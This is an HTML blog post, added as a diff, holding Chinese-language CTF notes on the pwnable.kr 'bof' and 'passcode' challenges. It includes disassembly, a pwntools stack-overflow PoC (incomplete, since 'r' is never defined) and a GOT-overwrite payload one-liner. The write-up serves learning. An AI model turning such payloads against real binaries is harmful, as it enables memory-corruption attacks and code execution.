@@ -1,0 +1,189 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pwn Note 0x01 | TU's Blog</title><meta name="author" content="0x0tu"><meta name="copyright" content="0x0tu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="0x00 前言最近練習靶機遇到一些Buffer Overflow的東西，且之前上課binary類的都不是很認真聽，打CTF也是都丟給隊友，結果現在就是要排時間補，想趁這個主題來練一下題目，並且把筆記整理一下。PWN目前應該會是以pwnable.kr的題目來練習，應該會摻雜一些pwnable.tw的題目，每篇應該都是1到2題。 0x01 BOFBOF (Buffer Overflow)算是經典中的經">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn Note 0x01">
+<meta property="og:url" content="https://milaroot.github.io/2023/07/17/Pwn-Note-0x01/index.html">
+<meta property="og:site_name" content="TU&#39;s Blog">
+<meta property="og:description" content="0x00 前言最近練習靶機遇到一些Buffer Overflow的東西，且之前上課binary類的都不是很認真聽，打CTF也是都丟給隊友，結果現在就是要排時間補，想趁這個主題來練一下題目，並且把筆記整理一下。PWN目前應該會是以pwnable.kr的題目來練習，應該會摻雜一些pwnable.tw的題目，每篇應該都是1到2題。 0x01 BOFBOF (Buffer Overflow)算是經典中的經">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images2.imgbox.com/6e/c1/xeNF9sgO_o.png">
+<meta property="article:published_time" content="2023-07-17T14:33:41.000Z">
+<meta property="article:modified_time" content="2023-07-17T14:38:33.620Z">
+<meta property="article:author" content="0x0tu">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images2.imgbox.com/6e/c1/xeNF9sgO_o.png"><link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/61993786?v=4"><link rel="canonical" href="https://milaroot.github.io/2023/07/17/Pwn-Note-0x01/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Pwn Note 0x01',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-17 10:38:33'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/61993786?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://images2.imgbox.com/6e/c1/xeNF9sgO_o.png')"><nav id="nav"><span id="blog-info"><a href="/" title="TU's Blog"><span class="site-name">TU's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Pwn Note 0x01</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-07-17T14:33:41.000Z" title="Created 2023-07-17 10:33:41">2023-07-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-07-17T14:38:33.620Z" title="Updated 2023-07-17 10:38:33">2023-07-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Pwn Note 0x01"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近練習靶機遇到一些Buffer Overflow的東西，且之前上課binary類的都不是很認真聽，打CTF也是都丟給隊友，結果現在就是要排時間補，想趁這個主題來練一下題目，並且把筆記整理一下。<br>PWN目前應該會是以pwnable.kr的題目來練習，應該會摻雜一些pwnable.tw的題目，每篇應該都是1到2題。</p>
+<h2 id="0x01-BOF"><a href="#0x01-BOF" class="headerlink" title="0x01 BOF"></a>0x01 BOF</h2><p>BOF (Buffer Overflow)算是經典中的經典，只要PWN的第一堂課或教學基本上都是BOF。而且他以沒學過資安的人來看根本是魔法，試想一下你的伺服器突然收到一堆a下一秒你伺服器就被pwn掉了，有夠詭異oAO。<br>這邊基本的概念就先不說明，網路上有很多厲害的前輩都有更完整更仔細的說明，這邊就先以整理解題思路為主。<br>這邊用objdump先看一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d ./bof</span><br></pre></td></tr></table></figure>
+<p>我們可以看到比較關鍵的兩個function</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">0000062c &lt;func&gt;:</span><br><span class="line"> 62c:   55                      push   %ebp</span><br><span class="line"> 62d:   89 e5                   mov    %esp,%ebp</span><br><span class="line"> 62f:   83 ec 48                sub    $0x48,%esp</span><br><span class="line"> 632:   65 a1 14 00 00 00       mov    %gs:0x14,%eax</span><br><span class="line"> 638:   89 45 f4                mov    %eax,-0xc(%ebp)</span><br><span class="line"> 63b:   31 c0                   xor    %eax,%eax</span><br><span class="line"> 63d:   c7 04 24 8c 07 00 00    movl   $0x78c,(%esp)</span><br><span class="line"> 644:   e8 fc ff ff ff          call   645 &lt;func+0x19&gt;</span><br><span class="line"> 649:   8d 45 d4                lea    -0x2c(%ebp),%eax</span><br><span class="line"> 64c:   89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 64f:   e8 fc ff ff ff          call   650 &lt;func+0x24&gt;</span><br><span class="line"> 654:   81 7d 08 be ba fe ca    cmpl   $0xcafebabe,0x8(%ebp)</span><br><span class="line"> 65b:   75 0e                   jne    66b &lt;func+0x3f&gt;</span><br><span class="line"> 65d:   c7 04 24 9b 07 00 00    movl   $0x79b,(%esp)</span><br><span class="line"> 664:   e8 fc ff ff ff          call   665 &lt;func+0x39&gt;</span><br><span class="line"> 669:   eb 0c                   jmp    677 &lt;func+0x4b&gt;</span><br><span class="line"> 66b:   c7 04 24 a3 07 00 00    movl   $0x7a3,(%esp)</span><br><span class="line"> 672:   e8 fc ff ff ff          call   673 &lt;func+0x47&gt;</span><br><span class="line"> 677:   8b 45 f4                mov    -0xc(%ebp),%eax</span><br><span class="line"> 67a:   65 33 05 14 00 00 00    xor    %gs:0x14,%eax</span><br><span class="line"> 681:   74 05                   je     688 &lt;func+0x5c&gt;</span><br><span class="line"> 683:   e8 fc ff ff ff          call   684 &lt;func+0x58&gt;</span><br><span class="line"> 688:   c9                      leave</span><br><span class="line"> 689:   c3                      ret</span><br><span class="line"></span><br><span class="line">0000068a &lt;main&gt;:</span><br><span class="line"> 68a:   55                      push   %ebp</span><br><span class="line"> 68b:   89 e5                   mov    %esp,%ebp</span><br><span class="line"> 68d:   83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line"> 690:   83 ec 10                sub    $0x10,%esp</span><br><span class="line"> 693:   c7 04 24 ef be ad de    movl   $0xdeadbeef,(%esp)</span><br><span class="line"> 69a:   e8 8d ff ff ff          call   62c &lt;func&gt;</span><br><span class="line"> 69f:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 6a4:   c9                      leave</span><br></pre></td></tr></table></figure>
+<p>我們經過觀察可以發現一個重要判斷</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">654:   81 7d 08 be ba fe ca    cmpl   <span class="variable">$0xcafebabe</span>,0x8(%ebp)</span><br><span class="line">65b:   75 0e                   jne    66b &lt;func+0x3f&gt;</span><br></pre></td></tr></table></figure>
+<p>這個部分代表程式會把0x8(%ebp)拿去和$0xcafebabe比較<br>如果不相同就跳開反之成功就會彈shell給我們<br>那這邊我們只要利用上面的get function overflow 0x8(%ebp)就好<br>我們能依照上面lea -0x2c(%ebp),%eax確認0x2c個a剛好蓋到ebp之後再+8個byte能蓋到0x8(%ebp)<br>最後在後面加上0xcafebabe</p>
+<p>PoC:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;./bof&quot;)</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&quot;a&quot;</span> * (<span class="number">0x2c</span> + <span class="number">8</span>) +  p32(<span class="number">0xcafebabe</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-passcode"><a href="#0x02-passcode" class="headerlink" title="0x02 passcode"></a>0x02 passcode</h2><p>這題算是GOT hijacking，觀念還蠻有趣的<br>以下是題目的描述<br>Well, there was some compiler warning, but who cares about that?<br>根據上面那段我們能找到他的c裡面有這段</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br></pre></td></tr></table></figure>
+<p>他是會把我們的輸入寫在passcode1上，而不是的值上<br>接著我們可以看到下面一行有fflush<br>這看起來我們只要把passcode1的位置改成fflush GOT<br>之後我們在輸入的時候只要把fflush GOT的位置寫成我們要執行的位置<br>這樣到了fflush我們就能執行我們想要跑的東西了<br>我們看一下objdump</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">08048564 &lt;login&gt;:</span><br><span class="line"> 8048564:       55                      push   %ebp</span><br><span class="line"> 8048565:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8048567:       83 ec 28                sub    $0x28,%esp</span><br><span class="line"> 804856a:       b8 70 87 04 08          mov    $0x8048770,%eax</span><br><span class="line"> 804856f:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048572:       e8 a9 fe ff ff          call   8048420 &lt;printf@plt&gt;</span><br><span class="line"> 8048577:       b8 83 87 04 08          mov    $0x8048783,%eax</span><br><span class="line"> 804857c:       8b 55 f0                mov    -0x10(%ebp),%edx</span><br><span class="line"> 804857f:       89 54 24 04             mov    %edx,0x4(%esp)</span><br><span class="line"> 8048583:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048586:       e8 15 ff ff ff          call   80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> 804858b:       a1 2c a0 04 08          mov    0x804a02c,%eax</span><br><span class="line"> 8048590:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048593:       e8 98 fe ff ff          call   8048430 &lt;fflush@plt&gt;</span><br><span class="line"> 8048598:       b8 86 87 04 08          mov    $0x8048786,%eax</span><br><span class="line"> 804859d:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 80485a0:       e8 7b fe ff ff          call   8048420 &lt;printf@plt&gt;</span><br><span class="line"> 80485a5:       b8 83 87 04 08          mov    $0x8048783,%eax</span><br><span class="line"> 80485aa:       8b 55 f4                mov    -0xc(%ebp),%edx</span><br><span class="line"> 80485ad:       89 54 24 04             mov    %edx,0x4(%esp)</span><br><span class="line"> 80485b1:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 80485b4:       e8 e7 fe ff ff          call   80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> 80485b9:       c7 04 24 99 87 04 08    movl   $0x8048799,(%esp)</span><br><span class="line"> 80485c0:       e8 8b fe ff ff          call   8048450 &lt;puts@plt&gt;</span><br><span class="line"> 80485c5:       81 7d f0 e6 28 05 00    cmpl   $0x528e6,-0x10(%ebp)</span><br><span class="line"> 80485cc:       75 23                   jne    80485f1 &lt;login+0x8d&gt;</span><br><span class="line"> 80485ce:       81 7d f4 c9 07 cc 00    cmpl   $0xcc07c9,-0xc(%ebp)</span><br><span class="line"> 80485d5:       75 1a                   jne    80485f1 &lt;login+0x8d&gt;</span><br><span class="line"> 80485d7:       c7 04 24 a5 87 04 08    movl   $0x80487a5,(%esp)</span><br><span class="line"> 80485de:       e8 6d fe ff ff          call   8048450 &lt;puts@plt&gt;</span><br><span class="line"> 80485e3:       c7 04 24 af 87 04 08    movl   $0x80487af,(%esp)</span><br><span class="line"> 80485ea:       e8 71 fe ff ff          call   8048460 &lt;system@plt&gt;</span><br><span class="line"> 80485ef:       c9                      leave</span><br><span class="line"> 80485f0:       c3                      ret</span><br><span class="line"> 80485f1:       c7 04 24 bd 87 04 08    movl   $0x80487bd,(%esp)</span><br><span class="line"> 80485f8:       e8 53 fe ff ff          call   8048450 &lt;puts@plt&gt;</span><br><span class="line"> 80485fd:       c7 04 24 00 00 00 00    movl   $0x0,(%esp)</span><br><span class="line"> 8048604:       e8 77 fe ff ff          call   8048480 &lt;exit@plt&gt;</span><br><span class="line"></span><br><span class="line">08048609 &lt;welcome&gt;:</span><br><span class="line"> 8048609:       55                      push   %ebp</span><br><span class="line"> 804860a:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 804860c:       81 ec 88 00 00 00       sub    $0x88,%esp</span><br><span class="line"> 8048612:       65 a1 14 00 00 00       mov    %gs:0x14,%eax</span><br><span class="line"> 8048618:       89 45 f4                mov    %eax,-0xc(%ebp)</span><br><span class="line"> 804861b:       31 c0                   xor    %eax,%eax</span><br><span class="line"> 804861d:       b8 cb 87 04 08          mov    $0x80487cb,%eax</span><br><span class="line"> 8048622:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048625:       e8 f6 fd ff ff          call   8048420 &lt;printf@plt&gt;</span><br><span class="line"> 804862a:       b8 dd 87 04 08          mov    $0x80487dd,%eax</span><br><span class="line"> 804862f:       8d 55 90                lea    -0x70(%ebp),%edx</span><br><span class="line"> 8048632:       89 54 24 04             mov    %edx,0x4(%esp)</span><br><span class="line"> 8048636:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 8048639:       e8 62 fe ff ff          call   80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line"> 804863e:       b8 e3 87 04 08          mov    $0x80487e3,%eax</span><br><span class="line"> 8048643:       8d 55 90                lea    -0x70(%ebp),%edx</span><br><span class="line"> 8048646:       89 54 24 04             mov    %edx,0x4(%esp)</span><br><span class="line"> 804864a:       89 04 24                mov    %eax,(%esp)</span><br><span class="line"> 804864d:       e8 ce fd ff ff          call   8048420 &lt;printf@plt&gt;</span><br><span class="line"> 8048652:       8b 45 f4                mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048655:       65 33 05 14 00 00 00    xor    %gs:0x14,%eax</span><br><span class="line"> 804865c:       74 05                   je     8048663 &lt;welcome+0x5a&gt;</span><br><span class="line"> 804865e:       e8 dd fd ff ff          call   8048440 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"> 8048663:       c9                      leave</span><br><span class="line"> 8048664:       c3                      ret</span><br><span class="line"></span><br><span class="line">08048665 &lt;main&gt;:</span><br><span class="line"> 8048665:       55                      push   %ebp</span><br><span class="line"> 8048666:       89 e5                   mov    %esp,%ebp</span><br><span class="line"> 8048668:       83 e4 f0                and    $0xfffffff0,%esp</span><br><span class="line"> 804866b:       83 ec 10                sub    $0x10,%esp</span><br><span class="line"> 804866e:       c7 04 24 f0 87 04 08    movl   $0x80487f0,(%esp)</span><br><span class="line"> 8048675:       e8 d6 fd ff ff          call   8048450 &lt;puts@plt&gt;</span><br><span class="line"> 804867a:       e8 8a ff ff ff          call   8048609 &lt;welcome&gt;</span><br><span class="line"> 804867f:       e8 e0 fe ff ff          call   8048564 &lt;login&gt;</span><br><span class="line"> 8048684:       c7 04 24 18 88 04 08    movl   $0x8048818,(%esp)</span><br><span class="line"> 804868b:       e8 c0 fd ff ff          call   8048450 &lt;puts@plt&gt;</span><br><span class="line"> 8048690:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 8048695:       c9                      leave</span><br></pre></td></tr></table></figure>
+<p>看起來我們跳到這邊可以繞過他的判斷，直接拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">80485d7:       c7 04 24 a5 87 04 08    movl   $0x80487a5,(%esp)</span><br><span class="line">80485de:       e8 6d fe ff ff          call   8048450 &lt;puts@plt&gt;</span><br><span class="line">80485e3:       c7 04 24 af 87 04 08    movl   $0x80487af,(%esp)</span><br><span class="line">80485ea:       e8 71 fe ff ff          call   8048460 &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>最後也是最重要的我們要如何把passcode1改成fflush GOT的位置<br>我們看了一遍code能發現其實welcome 和 login的ebp都是一樣的</p>
+<p>welcome在寫入時可以寫入 -0x70(%ebp)<br>passcode的位置是在     -0x10(%ebp)</p>
+<p>所以我們可以在welcome的時候寫入0x70 - 0x10個字元，之後在寫入fflush GOT的位置<br>最後輸入passcode1的時候輸入0x80485d7<br>我們就能拿到flag</p>
+<p>!!!因為scanf(“%d”, passcode1);是%d所以要輸入10進位<br>PoC:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print &#x27;a&#x27; * 96 + &#x27;\x04\xa0\x04\x08&#x27; + &#x27;134514135&#x27;&quot;</span> | ./passcode</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://milaroot.github.io">0x0tu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://milaroot.github.io/2023/07/17/Pwn-Note-0x01/">https://milaroot.github.io/2023/07/17/Pwn-Note-0x01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a><a class="post-meta__tags" href="/tags/Security/">Security</a></div><div class="post_share"><div class="social-share" data-image="https://images2.imgbox.com/6e/c1/xeNF9sgO_o.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/07/06/THM-WriteUp-Ollie/" title="THM-WriteUp_Ollie"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">THM-WriteUp_Ollie</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/06/20/%E5%A6%82%E4%BD%95%E8%87%AA%E5%B7%B1%E7%94%A8Docker%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E6%B8%AC%E8%A9%A6%E7%92%B0%E5%A2%83/" title="如何自己用Docker快速搭建漏洞測試環境"><img class="cover" src="https://images2.imgbox.com/30/65/2YnBhDA0_o.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-20</div><div class="title">如何自己用Docker快速搭建漏洞測試環境</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://avatars.githubusercontent.com/u/61993786?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">0x0tu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Milaroot"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Nope lol</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-BOF"><span class="toc-number">2.</span> <span class="toc-text">0x01 BOF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-passcode"><span class="toc-number">3.</span> <span class="toc-text">0x02 passcode</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/17/Pwn-Note-0x01/" title="Pwn Note 0x01"><img src="https://images2.imgbox.com/6e/c1/xeNF9sgO_o.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pwn Note 0x01"/></a><div class="content"><a class="title" href="/2023/07/17/Pwn-Note-0x01/" title="Pwn Note 0x01">Pwn Note 0x01</a><time datetime="2023-07-17T14:33:41.000Z" title="Created 2023-07-17 10:33:41">2023-07-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/06/THM-WriteUp-Ollie/" title="THM-WriteUp_Ollie">THM-WriteUp_Ollie</a><time datetime="2023-07-07T03:40:29.000Z" title="Created 2023-07-06 23:40:29">2023-07-06</time></div></div><div class="aside-list-item no-cover"><div 